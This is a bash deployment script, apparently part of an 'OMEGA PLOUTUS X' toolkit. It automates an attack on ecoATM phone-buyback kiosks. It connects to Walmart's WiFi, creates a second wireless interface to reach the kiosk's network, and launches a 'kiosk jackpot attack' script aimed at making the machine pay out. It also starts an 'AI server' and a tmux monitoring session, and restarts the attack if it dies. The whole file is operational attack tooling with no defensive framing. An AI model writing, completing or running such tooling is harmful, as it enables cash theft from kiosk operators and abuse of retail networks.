#!/bin/bash
# OMEGA PLOUTUS X - AUTOMATED ecoATM DEPLOYMENT SCRIPT
# 100% Fail-Proof WiFi Split + Attack Launch + Monitoring System
# Connects to Walmart WiFi, splits to ecoATM, launches jackpot attack, opens monitoring terminal

set -e  # Exit on any error
set -u  # Exit on undefined variables

# Configuration
WALMART_SSID="walmartwifi"
ECOATM_SSID="ecoATM"
PRIMARY_IFACE="wlan0"
SECONDARY_IFACE="wlan1"
ATTACK_SCRIPT="./omega_kiosk_attack/kiosk_jackpot_launcher.py"
LOG_FILE="/var/log/omega_deployment.log"
MONITOR_PORT=31338
AI_SERVER_PORT=31337

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Logging function
log() {
    echo "$(date '+%Y-%m-%d %H:%M:%S') - $*" | tee -a "$LOG_FILE"
}

# Error handling
error_exit() {
    echo -e "${RED}ERROR: $1${NC}" >&2
    log "ERROR: $1"
    cleanup
    exit 1
}

# Cleanup function
cleanup() {
    log "Performing cleanup..."

    # Disconnect WiFi connections
    nmcli device disconnect "$PRIMARY_IFACE" 2>/dev/null || true
    nmcli device disconnect "$SECONDARY_IFACE" 2>/dev/null || true

    # Remove secondary interface
    iw dev "$SECONDARY_IFACE" del 2>/dev/null || true

    # Kill any running processes
    pkill -f "omega_ai_server.py" 2>/dev/null || true
    pkill -f "kiosk_jackpot_launcher.py" 2>/dev/null || true
    pkill -f "omega_cli.py" 2>/dev/null || true

    log "Cleanup completed"
}

# Check root privileges
check_root() {
    if [[ $EUID -ne 0 ]]; then
        error_exit "This script must be run as root (sudo)"
    fi
}

# Install required packages
install_dependencies() {
    log "Checking and installing dependencies..."

    # Update package list
    apt update || error_exit "Failed to update package list"

    # Install required packages
    local packages=("network-manager" "iw" "wpasupplicant" "python3" "python3-pip" "tmux")
    for pkg in "${packages[@]}"; do
        if ! dpkg -l | grep -q "^ii  $pkg"; then
            log "Installing $pkg..."
            apt install -y "$pkg" || error_exit "Failed to install $pkg"
        else
            log "$pkg already installed"
        fi
    done

    # Check if virtual environment exists (from setup_environment.sh)
    if [[ -d "/opt/omega/venv" ]]; then
        # Use virtual environment
        source /opt/omega/venv/bin/activate
        pip install --upgrade pip || error_exit "Failed to upgrade pip in venv"
        pip install scapy requests || error_exit "Failed to install Python dependencies in venv"
        deactivate
    else
        # Fallback to system pip (may fail on Ubuntu 20.04+)
        pip3 install --upgrade pip || warning "Failed to upgrade pip (may be due to PEP 668)"
        pip3 install --break-system-packages scapy requests || pip3 install scapy requests || warning "Failed to install Python dependencies system-wide"
    fi

    # Enable and start NetworkManager
    systemctl enable NetworkManager || error_exit "Failed to enable NetworkManager"
    systemctl start NetworkManager || error_exit "Failed to start NetworkManager"

    log "Dependencies installation completed"
}

# Check WiFi interfaces
check_interfaces() {
    log "Checking WiFi interfaces..."

    if ! iw dev | grep -q "$PRIMARY_IFACE"; then
        error_exit "Primary WiFi interface $PRIMARY_IFACE not found"
    fi

    # Check if interface is already in use
    if nmcli device status | grep "$PRIMARY_IFACE" | grep -q "connected"; then
        log "Disconnecting existing connection on $PRIMARY_IFACE"
        nmcli device disconnect "$PRIMARY_IFACE" || error_exit "Failed to disconnect $PRIMARY_IFACE"
    fi

    log "WiFi interfaces check completed"
}

# Connect to Walmart WiFi
connect_walmart() {
    log "Connecting to $WALMART_SSID..."

    local max_attempts=5
    local attempt=1

    while [[ $attempt -le $max_attempts ]]; do
        log "Connection attempt $attempt/$max_attempts"

        if nmcli device wifi connect "$WALMART_SSID" ifname "$PRIMARY_IFACE"; then
            log "Successfully connected to $WALMART_SSID"
            return 0
        else
            log "Failed to connect to $WALMART_SSID (attempt $attempt)"
            sleep 2
            ((attempt++))
        fi
    done

    error_exit "Failed to connect to $WALMART_SSID after $max_attempts attempts"
}

# Create secondary WiFi interface
create_secondary_interface() {
    log "Creating secondary WiFi interface..."

    # Bring down primary interface
    ip link set "$PRIMARY_IFACE" down || error_exit "Failed to bring down $PRIMARY_IFACE"

    # Create secondary interface
    iw dev "$PRIMARY_IFACE" interface add "$SECONDARY_IFACE" type managed || error_exit "Failed to create secondary interface"

    # Bring up secondary interface
    ip link set "$SECONDARY_IFACE" up || error_exit "Failed to bring up $SECONDARY_IFACE"

    # Assign IP to secondary interface
    ip addr add 192.168.1.100/24 dev "$SECONDARY_IFACE" || error_exit "Failed to assign IP to secondary interface"

    log "Secondary interface $SECONDARY_IFACE created successfully"
}

# Connect to ecoATM WiFi
connect_ecoatm() {
    log "Connecting to $ECOATM_SSID..."

    local max_attempts=10
    local attempt=1

    while [[ $attempt -le $max_attempts ]]; do
        log "ecoATM connection attempt $attempt/$max_attempts"

        if nmcli device wifi connect "$ECOATM_SSID" ifname "$SECONDARY_IFACE"; then
            log "Successfully connected to $ECOATM_SSID"
            return 0
        else
            log "Failed to connect to $ECOATM_SSID (attempt $attempt)"
            sleep 3
            ((attempt++))
        fi
    done

    error_exit "Failed to connect to $ECOATM_SSID after $max_attempts attempts"
}

# Start AI server
start_ai_server() {
    log "Starting OMEGA AI Server..."

    # Stay in current directory (assuming script is run from omega root)

    if pgrep -f "omega_ai_server.py" > /dev/null; then
        log "AI server already running"
    else
        python3 omega_ai_server.py > /var/log/omega_ai_server.log 2>&1 &
        local ai_pid=$!

        # Wait for server to start
        sleep 3

        if ! kill -0 $ai_pid 2>/dev/null; then
            error_exit "AI server failed to start"
        fi

        log "AI server started (PID: $ai_pid)"
    fi
}

# Launch kiosk jackpot attack
launch_attack() {
    log "Launching kiosk jackpot attack..."

    if [[ ! -f "$ATTACK_SCRIPT" ]]; then
        error_exit "Attack script not found: $ATTACK_SCRIPT"
    fi

    # Make executable
    chmod +x "$ATTACK_SCRIPT" || error_exit "Failed to make attack script executable"

    # Launch attack
    python3 "$ATTACK_SCRIPT" --auto --target ecoatm > /var/log/omega_attack.log 2>&1 &
    local attack_pid=$!

    log "Attack launched (PID: $attack_pid)"
}

# Start monitoring terminal
start_monitoring() {
    log "Starting monitoring terminal..."

    # Check if tmux is available
    if ! command -v tmux >/dev/null 2>&1; then
        error_exit "tmux is required for monitoring terminal"
    fi

    # Create new tmux session
    tmux new-session -d -s omega_monitor || error_exit "Failed to create tmux session"

    # Split window for monitoring
    tmux split-window -h -t omega_monitor || error_exit "Failed to split tmux window"

    # Start AI CLI in one pane
    tmux send-keys -t omega_monitor:0.0 "python3 ECOMEGA_X1/server_listener/omega_cli.py --monitor" C-m

    # Start network monitoring in second pane
    tmux send-keys -t omega_monitor:0.1 "watch -n 2 'nmcli device status && echo && iw dev wlan1 link && echo && tail -5 /var/log/omega_deployment.log'" C-m

    # Attach to session (this will bring up the terminal)
    log "Monitoring terminal ready. Attaching..."
    tmux attach-session -t omega_monitor
}

# Health check
health_check() {
    log "Performing health check..."

    # Check WiFi connections
    if ! nmcli device status | grep "$PRIMARY_IFACE" | grep -q "connected"; then
        error_exit "Primary WiFi connection lost"
    fi

    if ! nmcli device status | grep "$SECONDARY_IFACE" | grep -q "connected"; then
        error_exit "Secondary WiFi connection lost"
    fi

    # Check AI server
    if ! nc -z localhost $AI_SERVER_PORT 2>/dev/null; then
        error_exit "AI server not responding"
    fi

    # Check attack process
    if ! pgrep -f "kiosk_jackpot_launcher.py" >/dev/null; then
        log "WARNING: Attack process not found, restarting..."
        launch_attack
    fi

    log "Health check passed"
}

# Main function
main() {
    log "=== OMEGA PLOUTUS X AUTOMATED ecoATM DEPLOYMENT STARTED ==="

    # Set up error handling
    trap cleanup EXIT

    # Run checks
    check_root
    install_dependencies
    check_interfaces

    # Connect to networks
    connect_walmart
    create_secondary_interface
    connect_ecoatm

    # Start services
    start_ai_server

    # Launch attack
    launch_attack

    # Initial health check
    health_check

    # Start monitoring (this will attach to tmux)
    start_monitoring

    log "=== DEPLOYMENT COMPLETED SUCCESSFULLY ==="
}

# Run main function
main "$@"
